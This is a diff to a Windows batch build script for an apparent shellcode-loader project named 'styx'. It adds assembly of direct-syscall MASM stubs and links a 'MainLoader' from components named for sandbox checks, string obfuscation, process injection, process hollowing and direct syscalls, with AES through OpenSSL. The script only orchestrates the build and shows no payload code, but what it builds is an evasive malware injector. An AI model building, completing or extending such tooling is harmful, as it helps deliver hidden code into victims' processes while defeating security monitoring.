@@ -45,9 +45,21 @@ echo Shellcode compilado: shellcode.bin
 cd ..
 
 echo.
+echo Paso 1.5: Compilando MASM syscall stubs...
+REM Assemble the direct-syscall MASM stubs (commit 3: replaces the broken
+REM MSVC inline __asm blocks that did not compile on x64 and contained NOPs).
+ml64.exe /nologo /c /Cp modules\asm\styx_syscalls.asm
+if %errorlevel% neq 0 (
+    echo Error assembling styx_syscalls.asm. Verifica Visual Studio Build Tools.
+    pause
+    exit /b 1
+)
+echo styx_syscalls.obj compilado.
+
+echo.
 echo Paso 2: Compilando loaders...
 REM Compilar SimpleInjector (standalone tool)
-REM New architecture (commit 2): src/*.cpp is the library, tools/*.cpp is the exe,
+REM New architecture: src/*.cpp is the library, tools/*.cpp is the exe,
 REM include/styxloader/*.hpp are the public headers.
 cl /EHsc /std:c++17 /Iinclude tools\simple_injector_tool.cpp src\shellcode.cpp src\simple_injector.cpp /Fe:SimpleInjector.exe
 if %errorlevel% neq 0 (
@@ -57,15 +69,11 @@ if %errorlevel% neq 0 (
 )
 echo SimpleInjector.exe compilado.
 
-REM Compile MainLoader (modular) with OpenSSL for AES
-REM New architecture (commit 2): src/*.cpp is the library, tools/main_loader.cpp is the exe.
-REM NOTE: src/direct_syscall.cpp depends on MASM stubs (modules/asm/styx_syscalls.asm)
-REM       which are added in commit 3. Until commit 3 is applied, the build will fail at
-REM       link time with unresolved StyxNt* symbols. This is expected.
-cl /EHsc /std:c++17 /Iinclude /I C:\OpenSSL\include tools\main_loader.cpp src\shellcode.cpp src\sandbox_check.cpp src\string_obfuscator.cpp src\simple_injector.cpp src\hollow_injector.cpp src\direct_syscall.cpp /LIBPATH C:\OpenSSL\lib /Fe:MainLoader.exe libcrypto.lib libssl.lib
+REM Compile MainLoader (modular) with OpenSSL + MASM stubs
+REM Links: tools/main_loader.cpp + src/*.cpp library + styx_syscalls.obj (MASM)
+cl /EHsc /std:c++17 /Iinclude /I C:\OpenSSL\include tools\main_loader.cpp src\shellcode.cpp src\sandbox_check.cpp src\string_obfuscator.cpp src\simple_injector.cpp src\hollow_injector.cpp src\direct_syscall.cpp modules\asm\styx_syscalls.obj /LIBPATH C:\OpenSSL\lib /Fe:MainLoader.exe libcrypto.lib libssl.lib
 if %errorlevel% neq 0 (
     echo Error compiling MainLoader. Check OpenSSL installation.
-    echo Note: if you see unresolved StyxNt* symbols, apply commit 3 (MASM stubs) first.
     pause
     exit /b 1
 )
